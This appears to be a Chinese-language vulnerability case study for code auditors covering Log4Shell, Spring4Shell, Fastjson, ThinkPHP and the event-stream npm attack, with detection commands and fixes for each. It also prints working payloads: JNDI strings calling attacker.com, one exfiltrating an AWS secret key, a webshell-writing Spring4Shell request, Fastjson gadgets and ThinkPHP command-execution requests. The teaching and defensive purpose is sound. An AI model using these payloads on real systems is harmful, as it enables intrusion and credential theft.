# Real World Vulnerabilities Case Study

> 真实漏洞案例库
> 覆盖: Log4Shell, Spring4Shell, Fastjson, ThinkPHP, Node.js 供应链

---

## Overview

通过分析真实漏洞案例，理解漏洞成因、利用方式和检测方法。每个案例包含：漏洞原理、影响版本、检测规则、PoC 和修复方案。

---

## Log4Shell (CVE-2021-44228)

### 漏洞信息

| 属性 | 值 |
|------|-----|
| CVE | CVE-2021-44228 |
| 类型 | RCE (JNDI 注入) |
| 严重程度 | Critical (CVSS 10.0) |
| 影响版本 | Log4j 2.0 - 2.14.1 |
| 修复版本 | 2.15.0+ (推荐 2.17.0+) |

### 漏洞原理

```java
// Log4j 2.x 的 Message Lookup Substitution 功能
// 会解析 ${} 表达式

// 日志记录时
logger.info("User logged in: " + username);

// 如果 username = "${jndi:ldap://attacker.com/exploit}"
// Log4j 会尝试进行 JNDI 查找，加载远程类

// 完整攻击链:
// 1. 攻击者发送包含 ${jndi:ldap://attacker.com/a} 的请求
// 2. 应用记录日志
// 3. Log4j 解析 ${} 表达式
// 4. 发起 LDAP 请求到攻击者服务器
// 5. 攻击者返回恶意类引用
// 6. 应用加载并执行恶意类
```

### 攻击载荷

```
# 基础载荷
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# 绕过 WAF
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}

# 带数据外带
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}
${jndi:ldap://${sys:java.version}.attacker.com/a}
```

### 检测规则

```bash
# 检测 Log4j 依赖
find . -name "log4j*.jar" -o -name "pom.xml" -exec grep -l "log4j" {} \;

# Maven
grep -rn "log4j-core" pom.xml
# 检查版本 < 2.17.0

# Gradle
grep -rn "log4j" build.gradle

# 检测可能被记录的用户输入
grep -rn "logger\.\(info\|warn\|error\|debug\)" --include="*.java" | grep -E "request\.|getParameter\|getHeader"
```

### 修复方案

```xml
<!-- 升级到安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>

<!-- 或完全移除 log4j-core，只用 API -->
```

```bash
# 临时缓解
# 设置系统属性
-Dlog4j2.formatMsgNoLookups=true

# 或环境变量
LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 或删除 JndiLookup 类
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

---

## Spring4Shell (CVE-2022-22965)

### 漏洞信息

| 属性 | 值 |
|------|-----|
| CVE | CVE-2022-22965 |
| 类型 | RCE (ClassLoader 操控) |
| 严重程度 | Critical (CVSS 9.8) |
| 影响条件 | JDK 9+ + Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19 + WAR 部署 |

### 漏洞原理

```java
// Spring MVC 参数绑定机制
// 可以通过特殊参数名访问对象属性链

// 请求
POST /vulnerable
class.module.classLoader.resources.context.parent.pipeline.first.pattern=...

// Spring 会尝试:
// obj.getClass()
//    .getModule()
//    .getClassLoader()
//    .getResources()
//    .getContext()
//    .getParent()
//    .getPipeline()
//    .getFirst()
//    .setPattern(...)

// JDK 9+ 引入的 Module 系统使得这条链可达 Tomcat 的 AccessLogValve
// 通过修改日志配置，写入 WebShell
```

### 攻击载荷

```
# 修改 Tomcat AccessLogValve 配置写入 WebShell

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i

class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

# Headers
c1: Runtime
c2: <%
suffix: %>
```

### 检测规则

```bash
# 检测 Spring 版本
grep -rn "spring-webmvc\|spring-beans" pom.xml build.gradle

# 检测可能存在参数绑定的端点
grep -rn "@ModelAttribute\|@RequestParam.*Map\|@RequestBody" --include="*.java"

# 检测 WAR 部署
ls *.war
find . -name "*.war"
```

### 修复方案

```xml
<!-- 升级 Spring Framework -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.3.18</version>
</dependency>

<!-- 或升级 Spring Boot -->
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.6.6</version>
</parent>
```

```java
// 临时缓解: 禁止 class 属性绑定
@ControllerAdvice
public class GlobalBinderConfiguration {
    @InitBinder
    public void setDisallowedFields(WebDataBinder binder) {
        binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");
    }
}
```

---

## Fastjson RCE

### 漏洞信息

| CVE | 版本范围 | 绕过方式 |
|-----|----------|----------|
| CVE-2017-18349 | < 1.2.25 | @type 直接利用 |
| CVE-2019-12384 | 1.2.25-1.2.47 | 缓存绕过 |
| CVE-2020-xxxx | 1.2.48-1.2.67 | 各种 Gadget |
| - | 1.2.68-1.2.80 | expectClass 绕过 |

### 漏洞原理

```java
// Fastjson 的 @type 功能允许反序列化任意类
// 1.2.25 之前无任何限制

String json = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}";
JSON.parseObject(json);

// 触发链:
// 1. Fastjson 解析 @type，实例化 JdbcRowSetImpl
// 2. 设置 dataSourceName 属性
// 3. 设置 autoCommit 触发 setAutoCommit()
// 4. setAutoCommit() 调用 connect()
// 5. connect() 发起 JNDI 查找
// 6. RCE
```

### 常见 Gadget

```json
// JdbcRowSetImpl (JNDI)
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x/Exploit","autoCommit":true}

// TemplatesImpl (字节码加载)
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["...base64..."],"_name":"a","_tfactory":{},"_outputProperties":{}}

// BasicDataSource (BCEL)
{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"$$BCEL$$..."}

// 1.2.47 绕过 (利用缓存)
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}}
```

### 检测规则

```bash
# 检测 Fastjson 依赖
grep -rn "fastjson" pom.xml build.gradle
# 版本 < 1.2.83 都有风险

# 检测 AutoType 配置
grep -rn "setAutoTypeSupport\|AutoTypeSupport" --include="*.java"

# 检测解析调用
grep -rn "JSON\.parse\|JSON\.parseObject\|JSON\.parseArray" --include="*.java"
```

### 修复方案

```xml
<!-- 升级到安全版本 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>

<!-- 或迁移到 fastjson2 -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.x</version>
</dependency>
```

```java
// 禁用 AutoType (默认已禁用)
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// 使用白名单
ParserConfig.getGlobalInstance().addAccept("com.myapp.entity.");
```

---

## ThinkPHP RCE

### 漏洞列表

| 版本 | CVE | 类型 |
|------|-----|------|
| 5.0.x | CVE-2018-20062 | 方法覆盖 RCE |
| 5.1.x | - | 反序列化 RCE |
| 6.0.x | CVE-2022-38627 | 多语言 RCE |

### 5.0.x 方法覆盖

```php
// 漏洞原理: _method 参数可覆盖请求方法，配合变量覆盖导致 RCE

// 攻击载荷 (5.0.0-5.0.23)
POST /index.php?s=captcha HTTP/1.1

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

// 或
_method=__construct&filter[]=system&method=get&get[]=whoami

// 利用链:
// 1. _method=__construct 调用 Request::__construct()
// 2. filter[] 覆盖 Request::filter
// 3. 调用 input() 方法时，filter 被调用
// 4. system('id') 执行
```

### 5.1.x 反序列化

```php
// 漏洞点: 反序列化可控数据

// Gadget Chain:
// think\process\pipes\Windows::__destruct()
//   -> think\process\pipes\Windows::removeFiles()
//     -> file_exists()
//       -> think\model\Pivot::__toString()
//         -> think\model\concern\Conversion::toJson()
//           -> think\model\concern\Conversion::toArray()
//             -> think\model\concern\Attribute::getAttr()
//               -> think\model\concern\Attribute::getValue()
//                 -> call_user_func() -> RCE
```

### 检测规则

```bash
# 检测 ThinkPHP 版本
grep -rn "THINK_VERSION\|thinkphp" --include="*.php"
cat composer.json | grep "topthink/framework"

# 检测危险路由
grep -rn "captcha\|_method" --include="*.php"
```

---

## Node.js event-stream (供应链攻击)

### 漏洞信息

| 属性 | 值 |
|------|-----|
| 包名 | event-stream@3.3.6 |
| 类型 | 供应链攻击 (Malicious Package) |
| 目标 | 窃取 Bitcoin 钱包 |
| 影响 | 每周 200 万+ 下载 |

### 攻击过程

```
1. 攻击者获取 event-stream 包的维护权
2. 添加恶意依赖 flatmap-stream
3. flatmap-stream 包含加密的恶意代码
4. 恶意代码针对 copay 钱包应用
5. 窃取 Bitcoin 私钥

// 恶意代码 (解密后)
var r = require;
try {
    var n = r("./bitcore-wallet-client/lib/credentials.js");
    // 劫持钱包凭证
} catch (e) {}
```

### 检测方法

```bash
# 检测恶意包
npm audit
yarn audit

# 检查 package-lock.json 中的 flatmap-stream
grep "flatmap-stream" package-lock.json

# 使用 snyk
snyk test

# 检查包的维护者变更
npm view event-stream
```

### 防护建议

```json
// package.json - 锁定版本
{
  "dependencies": {
    "event-stream": "3.3.4"  // 不使用 ^
  }
}

// 使用 npm shrinkwrap
npm shrinkwrap

// 审计依赖
npm audit
npm audit fix

// 使用 lockfile-lint
npx lockfile-lint --path package-lock.json --allowed-hosts npm
```

---

## 审计要点总结

### 依赖漏洞检测

```bash
# Java
mvn dependency-check:check
gradle dependencyCheckAnalyze

# Node.js
npm audit
yarn audit
snyk test

# Python
pip-audit
safety check

# Go
go list -m all | nancy sleuth
```

### 关键检测模式

```
Log4j:
- log4j-core 版本 < 2.17.0
- 用户输入被记录到日志

Spring4Shell:
- Spring Framework < 5.3.18 + JDK 9+ + WAR

Fastjson:
- fastjson < 1.2.83
- JSON.parseObject 解析不可信数据

ThinkPHP:
- 版本 5.x/6.x
- 路由配置不当

供应链:
- 定期审计依赖
- 锁定版本
- 监控维护者变更
```

---

## 参考资源

- [Log4Shell](https://logging.apache.org/log4j/2.x/security.html)
- [Spring4Shell](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Fastjson 漏洞汇总](https://github.com/LeadroyaL/fastjson-blacklist)
- [npm security](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities)

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
